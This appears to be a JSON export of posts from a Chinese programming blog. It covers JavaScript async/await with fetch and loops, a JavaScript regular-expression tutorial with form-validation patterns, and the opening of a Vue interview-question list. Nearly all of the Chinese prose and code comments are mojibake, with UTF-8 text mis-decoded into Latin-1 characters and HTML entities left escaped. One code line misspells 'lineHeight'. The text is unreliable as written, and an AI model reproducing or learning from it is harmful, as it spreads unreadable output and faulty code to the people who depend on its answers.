\u0026#39;é–‹å§‹\u0026lt;br/\u0026gt;\u0026#39;); await input(); // ç­‰å¾…è¼¸å…¥ï¼Œè¼¸å…¥å¾Œæ‰æœƒé€²è¡Œä¸‹ä¸€æ­¥ await input(); await input(); h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;çµæŸ\u0026#39;); }(); æ­é… Fetch åœ¨æˆ‘ä¹‹å‰çš„æ–‡ç«  JavaScript Fetch API ä½¿ç”¨æ•™å­¸ å·²ç¶“æœ‰æåˆ°fetchçš„ç”¨æ³•ï¼Œå› ç‚ºfetchæœ€å¾Œå›å‚³çš„æ˜¯ promiseï¼Œç†æ‰€ç•¶ç„¶çš„é€é async å’Œ await æ“ä½œæ˜¯æœ€æ°ç•¶ä¸éçš„ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œå…ˆå‰å¾€ ä¸­å¤®æ°£è±¡å±€é–‹æ”¾è³‡æ–™å¹³å° å¯ä»¥å–å¾—è¨±å¤šæ°£è±¡è³‡æ–™ï¼Œæ‰¾åˆ° å±€å±¬æ°£è±¡ç«™-ç¾åœ¨å¤©æ°£è§€æ¸¬å ±å‘Š ï¼Œè¤‡è£½ JSON æ ¼å¼çš„é€£çµ ( éœ€è¦è¨»å†Šç™»å…¥æ‰èƒ½çœ‹å¾—åˆ°é€£çµ )ï¼Œé€éfetchçš„json()æ–¹æ³•è™•ç†æª”æ¡ˆï¼Œç›®æ¨™é¡¯ç¤ºå‡ºã€Œé«˜é›„å¸‚çš„å³æ™‚æ°£æº«ã€ã€‚\né€é async å’Œ await çš„ç¾åŒ–ç¨‹å¼ç¢¼ï¼Œå¾—åˆ°çš„çµæœå®Œå…¨ä¸éœ€è¦ callback çš„è¼”åŠ©ï¼Œå°±èƒ½æŒ‰ç…§æˆ‘å€‘æ‰€æœŸæœ›çš„é †åºé€²è¡Œã€‚(å…ˆé¡¯ç¤ºã€Œé–‹å§‹æŠ“æ°£è±¡ã€ï¼Œæ¥è‘—é¡¯ç¤ºã€Œé«˜é›„å¸‚çš„æ°£æº«ã€ï¼Œæœ€å¾Œé¡¯ç¤ºã€Œç¸½ç®—çµæŸäº†ã€)\n1 2 3 4 5 6 7 8 9 10 11 12 ~async function(){ console.log(\u0026#39;é–‹å§‹æŠ“æ°£è±¡\u0026#39;); // å…ˆé¡¯ç¤ºã€Œé–‹å§‹æŠ“æ°£è±¡ã€ await fetch(\u0026#39;æ°£è±¡å±€ json ç¶²å€\u0026#39;) // å¸¶æœ‰ await çš„ fetch .then(res =\u0026gt; { return res.json(); }).then(result =\u0026gt; { let city = result.cwbopendata.location[14].parameter[0].parameterValue; let temp = result.cwbopendata.location[14].weatherElement[3].elementValue.value; console.log(`${city}çš„æ°£æº«ç‚º ${temp} åº¦ C`); }); console.log(\u0026#39;ç¸½ç®—çµæŸäº†\u0026#39;); // æŠ“å®Œæ°£è±¡ä¹‹å¾Œå†é¡¯ç¤ºã€Œç¸½ç®—çµæŸäº†ã€ }(); æ­é… è¿´åœˆ å¦‚æœè¦é€é JavaScript å¯¦ç¾ã€Œæ–‡å­—æ…¢æ…¢è®Šå¤§ã€çš„æ•ˆæœï¼Œé™¤äº†é€é CSS çš„ transition è¨­å®šä¹‹å¤–ï¼Œé€šå¸¸å°±æ˜¯ç›´æ¥ä½¿ç”¨setIntervalä¾†å®Œæˆï¼Œå°±åƒä¸‹é¢çš„ç¨‹å¼ç¢¼é€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 let size = 30; h.style.lineHeight = 0; const timer = setInterval(()=\u0026gt;{ h.style.fontSize = size + \u0026#39;px\u0026#39;; size = size + 1; if(size \u0026gt;= 130){ clearInterval(timer); } },10); å¦‚æœæ­é… async å’Œ awaitï¼Œæˆ‘å€‘å°±èƒ½å°‡åŒæ¨£çš„åšæ³•ï¼Œæ”¹ç”±ã€Œè¿´åœˆã€å¯¦ç¾ï¼Œå› ç‚ºä½¿ç”¨äº† awaitï¼Œæ‰€ä»¥è¿´åœˆæ¯æ¬¡åŸ·è¡Œæ™‚ï¼Œéƒ½æœƒé€²è¡Œã€Œç­‰å¾…ã€ï¼Œä¹Ÿå°±èƒ½åšåˆ°å­—é«”æ…¢æ…¢è®Šå¤§çš„æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML ç‚ºä¸€å€‹ h1 æ¨™ç±¤ \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;hello\u0026lt;/h1\u0026gt; ~async function(){ const delay = t =\u0026gt; { // å…ˆæ’°å¯«ä¸€å€‹ç­‰å¾…çš„ function return new Promise(resolve =\u0026gt; { setTimeout(resolve, t); }); }; h.style.linHeight = 0; for(let i=30; i\u0026lt;130; i++){ h.style.fontSize = i + \u0026#39;px\u0026#39;; await delay(10); // è¿´åœˆæ¯æ¬¡åŸ·è¡Œæ™‚ï¼Œéƒ½æœƒåœ¨é€™è£¡ç­‰å¾… 10ms } }(); åŒæ¨£çš„ï¼Œä¸Šé¢æåˆ°çš„ fetch æˆ–æ˜¯è¼¸å…¥æ–‡å­—ï¼Œåªè¦åšæˆ await çš„æ–¹å¼ï¼Œéƒ½å¯ä»¥æ”¾åœ¨è¿´åœˆè£¡é¢ä½¿ç”¨ï¼Œä¾‹å¦‚é€éè¿´åœˆä¸æ–·çš„ fetch è³‡æ–™ã€é€éè¿´åœˆä¸æ–·çš„è¼¸å…¥æ–‡å­—\u0026hellip;ç­‰ï¼Œé€™äº›å°±ä¸æ˜¯ callback æ–¹æ³•èƒ½å®¹æ˜“è¾¦åˆ°çš„å›‰\nå°çµ å¦ç™½èªªåªè¦ä½ ä¸€ä½†ç†Ÿæ‚‰äº† async å’Œ awaitï¼Œå°±çœŸçš„å›ä¸å»äº†ï¼Œé›–ç„¶èªª callback ä»ç„¶æ˜¯ç¨‹å¼é–‹ç™¼è£¡å¿…å‚™çš„åŠŸèƒ½ï¼Œä½†å°æ–¼åŒæ­¥å’ŒéåŒæ­¥ä¹‹é–“çš„è½‰æ›ï¼Œä»¥å¾Œå°±äº¤çµ¦ async å’Œ await ä¾†è™•ç†å§ï¼\n","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52281246237_dd06bc8ef9_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-async-await/","title":"Javascript çš„ Async/Await"},{"content":" åƒè€ƒç¶²ç«™\nå»ºç«‹æ­£è¦å¼ æ­£å‰‡è¡¨é”å¼çš„è¦å‰‡ç¨±ä½œ patternã€‚åœ¨ JavaScript ä¸­å¯ä»¥é€é Regular expression literals çš„æ–¹å¼æˆ–å»ºæ§‹å¼çš„æ–¹å¼ä¾†å»ºç«‹ regular expressions patternï¼š\næ–¹æ³•ä¸€ï¼šRegular expression literals script è¼‰å…¥æ™‚å³ç·¨è­¯ï¼Œç•¶ pattern ä¸æœƒæ”¹è®Šæ™‚ï¼Œä½¿ç”¨æ­¤æ–¹å¼å®šç¾© pattern æ•ˆèƒ½è¼ƒå¥½ã€‚ 1 var re = /ab+c/; æ–¹æ³•äºŒï¼šFunction Constructor ç¨‹å¼åŸ·è¡Œéç¨‹æ‰æœƒè¢«ç·¨è­¯ï¼Œæ•ˆèƒ½è¼ƒå·®ï¼Œé©åˆç”¨åœ¨ regular expression pattern å¯èƒ½æœƒæ”¹è®Šæ™‚ä½¿ç”¨ã€‚ 1 2 var re = new RegExp(\u0026#39;ab+c\u0026#39;); var myRe = new RegExp(\u0026#39;d(b+)d\u0026#39;, \u0026#39;g\u0026#39;); Regular expression literals æ•ˆèƒ½è¼ƒå¥½ï¼Œé©åˆ pattern ä¸æœƒæ”¹è®Šçš„æƒ…æ³ï¼›\nFunction Constructor æ•ˆèƒ½è¼ƒå·®ï¼Œé©åˆç”¨åœ¨ pattern å¯èƒ½å‹•æ…‹æ”¹è®Šçš„æƒ…æ³ã€‚\nä½¿ç”¨æ­£è¦å¼ åœ¨ JavaScript ä¸­å¯ä»¥ä½¿ç”¨æ­£è¦å¼çš„å‡½å¼åŒ…å«ï¼š\nRegExp.prototype.test()ï¼šæœå°‹å­—ä¸²ä¸­æ˜¯å¦æœ‰ç¬¦åˆçš„éƒ¨åˆ†ï¼Œå›å‚³ true/falseã€‚ RegExp.prototype.exec()ï¼šä»¥é™£åˆ—å›å‚³å­—ä¸²ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ†ï¼Œå¦å‰‡å›å‚³ nullã€‚ String.prototype.match()ï¼šä»¥é™£åˆ—å›å‚³å­—ä¸²ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ†ï¼Œå¦å‰‡å›å‚³ nullã€‚ String.prototype.replace()ï¼šå°‹æ‰¾å­—ä¸²ä¸­åŒ¹é…çš„éƒ¨åˆ†ï¼Œä¸¦å–ä»£ä¹‹ã€‚ String.prototype.search()ï¼šå°‹æ‰¾å­—ä¸²ä¸­æ˜¯å¦æœ‰ç¬¦åˆçš„éƒ¨åˆ†ï¼Œæœ‰çš„è©±å›å‚³ indexï¼Œå¦å‰‡å›å‚³ -1ã€‚ String.prototype.split()ï¼šåœ¨å­—ä¸²æ ¹æ“šåŒ¹é…åˆ°çš„é …ç›®æ‹†æˆé™£åˆ—ã€‚ ç°¡å–®ä¾†èªªï¼Œç•¶ä½ æƒ³è¦çœ‹å­—ä¸²æ˜¯å¦åŒ…å«æŸ pattern æ™‚ï¼Œä½¿ç”¨ test æˆ– searchï¼›\næƒ³è¦æ›´å¤šçš„è³‡è¨Šï¼ˆèŠ±è¼ƒå¤šè€—æ•ˆèƒ½ï¼‰ï¼Œå‰‡ä½¿ç”¨ exec æˆ– matchã€‚\nç‰¹æ®Šå­—å…ƒ (character) æ¨™ç±¤ï¼ˆflagï¼‰ 1 2 3 regex = /hello/; // å€åˆ†å¤§å°å¯«ï¼ŒåŒ¹é… \u0026#34;hello\u0026#34;, \u0026#34;hello123\u0026#34;, \u0026#34;123hello123\u0026#34;, \u0026#34;123hello\u0026#34;ï¼Œä½†ä¸åŒ¹é… \u0026#34;hell0\u0026#34;, \u0026#34;Hello\u0026#34; regex = /hello/i; // ä¸å€åˆ†å¤§å°å¯«ï¼ŒåŒ¹é… \u0026#34;hello\u0026#34;, \u0026#34;HelLo\u0026#34;, \u0026#34;123HelLO\u0026#34; regex = /hello/g; // å…¨åŸŸæœå°‹ ES 2019 æ–°å¢ /s çš„æ¨™ç±¤ï¼Œéå» . å¯ä»¥ç”¨ä¾†åŒ¹é…é™¤äº†æ›è¡Œç¬¦è™Ÿä»¥å¤–ï¼ˆ\\n, \\rï¼‰çš„æ‰€æœ‰å­—å…ƒï¼š\n1 2 3 // éå» . å¯ä»¥åŒ¹é…åˆ°é™¤äº†ã€Œæ›è¡Œç¬¦è™Ÿã€ä»¥å¤–çš„æ‰€æœ‰å­—å…ƒ console.log(/./.test(\u0026#39;\\n\u0026#39;)); // â†’ false console.log(/./.test(\u0026#39;\\r\u0026#39;)); // â†’ false éå»é›–ç„¶å¯ä»¥ä½¿ç”¨ [\\w\\W] ä¾†åŒ¹é…åˆ°æ›è¡Œç¬¦è™Ÿï¼Œä½†é€™ä¸æ˜¯æœ€å¥½çš„åšæ³•ï¼š\n1 2 console.log(/[\\w\\W]/.test(\u0026#39;\\n\u0026#39;)); // â†’ true console.log(/[\\w\\W]/.test(\u0026#39;\\r\u0026#39;)); // â†’ true åœ¨ ES 2019 ä¸­ï¼Œåªè¦æœ€å¾Œæœ‰æ¨™è¨˜ /s çš„æ¨™ç±¤ï¼Œå¦‚æ­¤ . å°‡ä¹Ÿèƒ½å¤ åŒ¹é…åˆ°æ›è¡Œç¬¦è™Ÿï¼š\n1 2 console.log(/./s.test(\u0026#39;\\n\u0026#39;)); // â†’ true console.log(/./s.test(\u0026#39;\\r\u0026#39;)); // â†’ true æ™®é€šå­—å…ƒ // 1 2 var regex = /a/; var regex = /is/; åæ–œç·š \\ 1 2 3 4 5 6 /* åœ¨ã€Œéã€ç‰¹æ®Šå­—å…ƒå‰é¢ä½¿ç”¨åæ–œç·šæ™‚ï¼Œè¡¨ç¤ºè¦æŠŠåæ–œç·šå¾Œçš„å­—ç•¶ä½œæ˜¯ç‰¹æ®Šå­—å…ƒ */ var regex = /\\b/; // b åŸæœ¬ä¸æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œé€™å€‹ b è¦ç•¶æˆç‰¹æ®Šå­—å…ƒ /* åœ¨ç‰¹æ®Šå­—å…ƒå‰é¢ä½¿ç”¨åæ–œç·šæ™‚ï¼Œè¡¨ç¤ºè¦æŠŠåæ–œç·šå¾Œçš„å­—ç•¶ä½œæ˜¯ã€Œéã€ç‰¹æ®Šå­—å…ƒ */ var regex = /if\\(true/; // ( åŸæœ¬æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œä½†é€™è£¡è¦ç•¶æˆéç‰¹æ®Šå­—å…ƒ var regex = /1\\+2=3/; // + åŸæœ¬æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œä½†é€™è£¡è¦ç•¶æˆéç‰¹æ®Šå­—å…ƒ ä»»æ„ä¸€å€‹å­—å…ƒ . å¯ä»¥ç”¨ä¾†åŒ¹é…é™¤äº†æ›è¡Œç¬¦è™Ÿï¼ˆ\\nï¼‰ä»¥å¤–çš„æ‰€æœ‰å­—å…ƒï¼š 1 2 3 var regex = /a.man/; // a*man éƒ½æœƒ matchï¼Œä¾‹å¦‚ \u0026#34;acman\u0026#34;, \u0026#34;awman\u0026#34;, ä½† \u0026#34;a\\nman\u0026#34; ç„¡æ³•åŒ¹é…ã€‚ var regex = /.a/; // ä»»ä½•ä¸€å€‹å­—å…ƒå¾ŒåŠ ä¸Š a å¤šå€‹å­—å…ƒ [] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // å°å¯« a æˆ–å¤§å¯« A var regex = /[aA]/; // åŒ¹é…æ‰€æœ‰ä¸æ˜¯ a æˆ– A çš„å­— var regex = /[^aA]/; // a, e, i, o, u éƒ½æœƒ match var regex = /[aeiou]/; // è‹±æ–‡å­—æ¯ var regex = /[a-z]/; // æ‰€æœ‰å°å¯«çš„å­—æ¯ï¼Œå¾å°å¯« a åˆ°å°å¯« z var regex = /[A-Z]/; // æ‰€æœ‰å¤§å¯«çš„å­—æ¯ï¼Œå¾å¤§å¯« A åˆ°å¤§å¯« Z var regex = /[a-zA-Z]/; // æ‰€æœ‰è‹±æ–‡å­—æ¯ // æ•¸å­— 5 ~ 8 var regex = /[5-8]/; æ‹¬è™Ÿ () å¥—ç”¨åˆ°æ‰€æœ‰ 1 2 3 var regex = /^a|^the|^an/; // å¥—ç”¨åˆ°è£¡é¢æ‰€æœ‰çš„ var regex = /^(a|the|an)/; // ç­‰åŒæ–¼ ä¸æ˜¯ï¼ˆé™¤äº†ï¼‰ ^ 1 2 3 4 5 /* ä¸æ˜¯ a éƒ½æœƒ match */ var regex = /[^a]/; /* ä¸æ˜¯æ•¸å­—éƒ½æœƒ match */ var regex = /[^0-9]/; å¤šå€‹å­—å…ƒç¸®å¯« keywordsï¼š\\dã€\\wã€\\sã€\\bã€\\Dã€\\Wã€\\S \\d : digitï¼Œ[0-9] \\w : wordï¼ŒåŒ…å«è‹±æ–‡å¤§å°å¯«ã€æ•¸å­—ã€åº•ç·šï¼Œ[A-Za-z0-9_] \\s : spaceï¼ŒåŒ…å« space, tab, form feed, line feedï¼Œ[\\f\\n\\r\\t\\v\\u00a0\\u1680\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff] \\D : ä¸æ˜¯ digitï¼Œç­‰åŒæ–¼ [^\\d] \\W : ä¸æ˜¯ wordï¼Œç­‰åŒæ–¼ [^\\w] \\S : ä¸æ˜¯ spaceï¼Œç­‰åŒæ–¼ [^\\s] 1 2 3 4 5 6 7 8 9 10 /* æ‰€æœ‰ word + e */ var regex = /\\we/; /* é€£çºŒå…©å€‹ä»»æ„çš„æ•¸å€¼ */ var regex = /\\d\\d/; /* å¥å­ä¸­çµå°¾ç‚º s çš„å–®å­— */ var regex = /s\\b/; var regex = /\\b[a-z]/g; // å¥å­ä¸­å„å€‹å–®å­—çš„ç¬¬ä¸€å€‹å­—æ¯ å…¶ä»–ç‰¹æ®Šå­—å…ƒï¼š \\t : tab \\b : word boundaryï¼Œç”¨ä¾†æ¯”å°å–®å­—å’Œå–®å­—é–“çš„ç©ºç™½ï¼Œ/s\\b/ å‰‡æœƒæ¯”å°å¥å­ä¸­æœ€ä¸€å€‹å­—æ¯æ˜¯ s çš„å–®å­— Word boundary \\bã€\\B é€é \\b å¯ä»¥é…å° word boundaryï¼Œword boundary æŒ‡çš„æ˜¯ä¸€å€‹å­—å…ƒçš„å‰å¾Œæ²’æœ‰å…¶ä»–ä»»ä½•å­—å…ƒã€‚\nè¦æ³¨æ„ \\b å’Œ [\\b] æ˜¯ä¸ä¸€æ¨£çš„ï¼Œ[\\b] æ˜¯ç”¨ä¾†é…å° backspaceã€‚\n1 2 3 // is é€™å€‹å–®å­—æ‰æœƒè¢«é¸åˆ°ï¼ŒTh`is` çš„ is ä¸æœƒ let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\bis\\b/); // [ \u0026#39;is\u0026#39;, index: 5, input: \u0026#39;This is an apple.\u0026#39; ] ç›¸ååœ°ï¼Œ\\B å‰‡æ˜¯ non-word boundaryï¼š\nBefore the first character of the string, if the first character is not a word character. After the last character of the string, if the last character is not a word character. Between two word characters Between two non-word characters The empty string 1 2 3 4 // ä½¿ç”¨ \\B æœƒé…å°åˆ° This ä¸­çš„ is let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\Bis/); // [ \u0026#39;is\u0026#39;, index: 2, input: \u0026#39;This is an apple.\u0026#39; ] å‡ºç¾æ¬¡æ•¸ * + ? {} {, } keywordsï¼š * ã€+ã€?ã€{æ¬¡æ•¸}ã€{æœ€å°‘æ¬¡æ•¸, æœ€å¤šæ¬¡æ•¸} * : ä»»æ„æ¬¡æ•¸ï¼Œç­‰åŒæ–¼{0,} + : è‡³å°‘ä¸€æ¬¡ï¼ˆå¾Œé¢è¦è·Ÿè‘—ï¼‰ï¼Œç­‰åŒæ–¼ {1,} ? : é›¶æˆ–ä¸€æ¬¡ï¼ˆæœ‰æˆ–æ²’æœ‰ï¼‰ï¼Œç­‰åŒæ–¼ {0,1} {æ¬¡æ•¸} {æœ€å°‘æ¬¡æ•¸, æœ€å¤šæ¬¡æ•¸} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var regex = /abc/; // æ‰¾åˆ°ç¬¦åˆ \u0026#34;abc\u0026#34; var regex = /ab*c/; // *è¡¨ç¤ºå‰ä¸€å€‹å–®å­—å¯ä»¥æ˜¯ 0 å€‹æˆ–å¤šå€‹ï¼Œå› æ­¤ ac, abc, abbbbc éƒ½ç¬¦åˆè¦å‰‡ var regex = /n?a/; // n å¯æœ‰å¯ç„¡ var regex = /a{2}/; // a è¦ 2 æ¬¡ï¼Œæ‰€ä»¥æœƒæ˜¯ a var regex = /a{2,4}/; // a ä»‹æ–¼ 2 æ¬¡åˆ° 4 æ¬¡ä¹‹é–“ var regex = /a{2,}/; // 2 æ¬¡ä»¥ä¸Šçš„ a éƒ½å¯ä»¥ï¼Œå¤§æ‹¬è™Ÿå¾Œé¢ä¸è¦æœ‰ç©ºæ ¼ var regex = /(hello){4}/; // 4 æ¬¡çš„ helloï¼Œhellohellohellohello var regex = /\\d{3}/; // 3 æ¬¡çš„æ•¸å­— é–‹é ­èˆ‡çµå°¾ keywordsï¼š^ã€$ ^ é–‹é ­ $ çµå°¾ 1 2 3 4 5 6 7 8 9 10 11 12 /* ä»¥ A é–‹é ­çš„å­—æ‰æœƒåŒ¹é…åˆ° */ /^A/gm.test(\u0026#39;Abc\u0026#39;); // true /^A/gm.test(\u0026#39;bac\u0026#39;); // false /* é–‹é ­æœ‰ He */ var regex = /^He/; /* çµå°¾æœ‰ llo */ var regex = /llo$/; /* é–‹é ­ He çµå°¾ llo ä¸­é–“ä»»æ„å­—å…ƒå¯ä»¥æœ‰ä»»æ„æ¬¡æ•¸ */ var regex = /^He.*llo$/; æˆ– | 1 2 3 4 5 // and æˆ– androidï¼Œmatch åˆ° `and`roid å°±ä¸ match `android` var regex = /and|android/; // match åˆ° android é‚„æ˜¯æœƒ match and var regex = /android|and/; LookAround Assertions keywords: x(?=y)ã€x(?!y) Lookahead assertions: x(?=y)ã€x(?!y) Lookbehind assertions: (?\u0026lt;=y)xã€(?\u0026lt;!y)x Look Ahead ?=ï¼šå¾Œé¢éœ€è¦è·Ÿè‘— ?!ï¼šå¾Œé¢ä¸èƒ½è·Ÿè‘— 1 2 3 4 5 6 7 8 9 10 11 12 // foo(?=bar)ï¼Œfoo å¾Œé¢è¦è·Ÿè‘— bar æ‰æœƒé…å°åˆ° foo const regexp = /foo(?=bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // foo(?!bar)ï¼Œfoo å¾Œé¢ä¸èƒ½è·Ÿè‘— barï¼Œå¦‚æ­¤æ‰æœƒé…å°åˆ° foo const regexp = /foo(?!bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foo123\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo123\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // null Look Behind ?\u0026lt;=ï¼šå‰é¢éœ€è¦è·Ÿè‘—æ‰æœƒåŒ¹é…åˆ° ?\u0026lt;!ï¼šå‰é¢ä¸èƒ½è·Ÿè‘—æ‰æœƒåŒ¹é…åˆ° 1 2 3 4 5 6 7 8 9 10 11 12 // (?\u0026lt;=foo)barï¼Œç•¶ bar å‰é¢æœ‰ foo æ™‚æ‰æœƒé…å°åˆ° bar const regexp = /(?\u0026lt;=foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // (?\u0026lt;!foo)barï¼Œç•¶ bar å‰é¢æ²’æœ‰ foo æ™‚æ‰æœƒé…å°åˆ° bar const regexp = /(?\u0026lt;!foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 0, input: \u0026#39;bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;123bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;123bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foobar\u0026#39;); // null â—â—â— Lookbehind assertions å±¬æ–¼ ES2018 çš„èªæ³•ï¼Œé ˆæ³¨æ„ç›¸å®¹æ€§ã€‚ â—â—â—\nè²ªå©ªæ¨¡å¼ï¼ˆGreedy Modeï¼‰ é è¨­æœƒå•Ÿç”¨è²ªå©ªæ¨¡å¼ï¼Œå¦‚æœæƒ³è¦é—œé–‰è²ªå©ªæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è®“åˆ°ä¸€åŒ¹é…åˆ°å°±åœæ­¢ï¼Œå¯ä»¥ä½¿ç”¨åœ¨ * ã€ + ç­‰å¾Œé¢åŠ ä¸Š ?ï¼Œä¾‹å¦‚ .*?ã€.+?ã€‚\npattern ç­†è¨˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 export default { // å…è¨±æ•¸å­—ã€è‹±æ–‡å­— // é•·åº¦4~12 account: /^[0-9A-Za-z]{4,12}$/, // éœ€åŒ…å«æ•¸å­—ã€è‹±æ–‡å­—ã€è‹±æ–‡ç‰¹æ®Šç¬¦è™Ÿ // ä½†ä¸å¾—åŒ…å«ç¬¦è™Ÿ \\ // é•·åº¦1~24 password: /^(?=.*\\d)(?=.*[a-zA-Z])[a-zA-Z0-9!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~`]{1,24}$/, // å…è¨±æ•¸å­—ã€è‹±æ–‡å­—ã€ä¸­æ–‡å­— // é•·åº¦2~8 nickName: /^[0-9A-Za-z\\u4E00-\\u9FFF]{2,8}$/, // å…è¨±æ•¸å­—ã€è‹±æ–‡å­—ã€ä¸­æ–‡å­—ã€è‹±æ–‡ç‰¹æ®Šç¬¦è™Ÿã€ç©ºç™½ï¼Œä½†é–‹é ­ä¸å¾—ç‚ºç‰¹æ®Šç¬¦è™Ÿæˆ–ç©ºç™½ realName: /^(?!(-))(?!(\\s))(?!(,))[A-Za-z\\-\\,\\s\\u4E00-\\u9FFF]{0,20}[^(?=(!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~\\s\\d`)))]$/, // ä¿¡ç®± createEmail: /^([\\w])([\\-\\._]?[\\w]){0,64}\\@([\\w])([\\-\\._]?[\\w]){0,64}\\.([a-zA-Z]){2,6}$/, // å‰ä¸‰ç¢¼è‹±æ–‡å­—ã€å¾Œä¸‰ç¢¼æ•¸å­— promotionCode: /^[A-Za-z]{3}[0-9]{3}$/, // å…è¨±æ•¸å­—ã€è‹±æ–‡å­—ã€ä¸­æ–‡å­—ã€è‹±æ–‡ç‰¹æ®Šç¬¦è™Ÿã€ä¸­æ–‡ç‰¹æ®Šç¬¦è™Ÿã€ç©ºç™½ // é•·åº¦0~100 remark: /^[0-9A-Za-z-_\\u4E00-\\u9FA5+/.*!@#$%\u0026amp;?()=|\u0026#39;:;\u0026lt;\u0026gt;,~ï¼@#ï¿¥â€¦â€¦\u0026amp;*ï¼ˆï¼‰â€”â€”|{}ã€ã€‘â€˜ï¼›ï¼šâ€â€œ\u0026#39;ã€‚ï¼Œã€ï¼Ÿ%\\s]{0,100}$/, } ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282544509_9802b00af7_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-regex/","title":"Javascript çš„æ­£å‰‡è¡¨é”å¼(Regular Expression, regex)"},{"content":" åƒè€ƒç¶²ç«™\nåŸºç¤ç¯‡ 1. å° SPA å–®é â¾¯çš„ç†è§£ï¼Œå„ªç¼ºé»æ˜¯ä»€éº¼ï¼Ÿ SPAï¼ˆ single-page application ï¼‰åƒ…åœ¨ Web é â¾¯åˆå§‹åŒ–æ™‚åŠ è¼‰ç›¸æ‡‰çš„ HTMLã€JavaScript å’Œ CSSã€‚ â¼€æ—¦é â¾¯åŠ è¼‰å®Œæˆï¼ŒSPA ä¸æœƒå› ç‚ºâ½¤æˆ¶çš„æ“ä½œâ½½é€²â¾â»šâ¾¯çš„é‡æ–°åŠ è¼‰æˆ–è·³è½‰ï¼›å–â½½ä»£ä¹‹çš„æ˜¯åˆ©â½¤è·¯ç”±æ©Ÿåˆ¶å¯¦ç¾ HTML å…§å®¹çš„è®Šæ›ï¼ŒUI èˆ‡â½¤æˆ¶çš„äº¤äº’ï¼Œé¿å…é â¾¯çš„é‡æ–°åŠ è¼‰ã€‚ å„ªé»ï¼š â½¤æˆ¶é«”é©—å¥½ã€å¿«ï¼Œå…§å®¹çš„æ”¹è®Šä¸éœ€è¦é‡æ–°åŠ è¼‰æ•´å€‹é â¾¯ï¼Œé¿å…äº†ä¸å¿…è¦çš„è·³è½‰å’Œé‡è¤‡æ¸²æŸ“ SPA ç›¸å°å°æœå‹™å™¨å£“â¼’â¼© å‰å¾Œç«¯è·è²¬åˆ†é›¢ï¼Œæ¶æ§‹æ¸…æ™°ï¼Œå‰ç«¯é€²â¾äº¤äº’é‚è¼¯ï¼Œå¾Œç«¯è² è²¬æ•¸æ“šè™•ç† ç¼ºé»ï¼š â¾¸å±ï¼ˆåˆæ¬¡ï¼‰åŠ è¼‰æ…¢ï¼šç‚ºå¯¦ç¾å–®â»š Web æ‡‰â½¤åŠŸèƒ½åŠé¡¯ç¤ºæ•ˆæœï¼Œéœ€è¦åœ¨åŠ è¼‰â»šâ¾¯çš„æ™‚å€™å°‡JavaScriptã€CSS çµ±â¼€åŠ è¼‰ï¼Œéƒ¨åˆ†â»šâ¾¯æŒ‰éœ€åŠ è¼‰ ä¸åˆ©æ–¼ SEOï¼šç”±æ–¼æ‰€æœ‰çš„å…§å®¹éƒ½åœ¨â¼€å€‹â»šâ¾¯ä¸­å‹•æ…‹æ›¿æ›é¡¯ç¤ºï¼Œæ‰€ä»¥åœ¨ SEO ä¸Šå…¶æœ‰è‘—å¤©ç„¶çš„å¼±å‹¢ 2. new Vue() ç™¼ç”Ÿäº†ä»€éº¼ï¼Ÿ çµè«–ï¼šnew Vue()æ˜¯å‰µå»ºVueå¯¦ä¾‹ï¼Œå®ƒå…§éƒ¨åŸ·è¡Œäº†æ ¹å¯¦ä¾‹çš„åˆå§‹åŒ–éç¨‹ å…·é«”åŒ…æ‹¬ä»¥ä¸‹æ“ä½œï¼š é¸é …åˆä½µï¼Œchildren, refs, slot, createElementç­‰å®ä¾‹å±æ€§çš„æ–¹æ³•åˆå§‹åŒ– è‡ªå®šç¾©äº‹ä»¶è™•ç† æ•¸æ“šéŸ¿æ‡‰å¼è™•ç† ç”Ÿå‘½é€±æœŸé‰¤å­èª¿ç”¨ (beforecreate created) å¯èƒ½çš„æ›è¼‰ 